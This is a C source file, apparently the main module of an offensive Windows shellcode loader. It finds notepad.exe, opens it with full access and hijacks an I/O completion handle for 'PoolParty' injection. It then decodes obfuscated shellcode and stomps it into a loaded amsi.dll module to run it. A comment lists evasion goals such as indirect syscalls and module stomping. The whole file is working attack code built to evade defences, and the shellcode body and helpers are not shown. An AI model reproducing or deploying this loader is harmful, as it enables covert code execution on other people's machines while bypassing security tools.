#include <windows.h>
#include <tlhelp32.h>
#include <unwin.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "injection/injection.h"
#include "memory/memory.h"
#include "shellcode/shellcode.h"
#include "syscalls/syscalls.h"

extern Ade GlobalAde;

// TODO: refactoring

/* Objectives:
    * Inject with PoolParty I/O (starting thread) (DONE)
    * Indirect syscalls (dynamic evasion) (DONE)
    * Module stomping (memory scan evasion) (DONE)
    * Heap/stack encryption (memory scan evasion)
    * Shellcode obfuscation (static evasion) (DONE)

    * EXTRA: impl. DLL, PE or shellcode injection 
*/

#define TARGET_PROCNAME "notepad.exe"

int GetPidByProcname(char* procname) {
    int pid = 0;
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, procname) == 0) {
                pid = pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    return pid;
}

int main() {
    char moduleToLoad[] = "C:\\Windows\\System32\\amsi.dll";
    HANDLE hproc;
    GlobalAde = InitAde();
    int pid = GetPidByProcname(TARGET_PROCNAME);

    if (!(hproc = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    ))) {
#ifdef DEBUG
        printf("OpenProcess ERROR: 0x%x", GetLastError());
        getchar();
#endif
        return -1;
    }

    HANDLE completionIoHandle = DuplicateHandleK(
        hproc,
        pid,
        IO_COMPLETION_HANDLETYPE
    );

    // [ Alloc and decode shellcode ]

    size_t shellcode_size = GetShellcodeSize();
    BYTE shellcode[shellcode_size];
    ShellcodeDecode(shellcode);

    // [ Allocate into a legit module and get the trampoline ]

    MODULE_STOMPING moduleStomping;
    ModuleStomping(
        hproc,
        moduleToLoad,
        shellcode,
        shellcode_size,
        sizeof(moduleToLoad),
        &moduleStomping
    );

    // [ Start the injection ]
    Inject(hproc, completionIoHandle, moduleStomping.executionAddr);

#ifdef DEBUG
    printf("Press enter for close the program...");
    getchar();
#endif

    return 0;
}
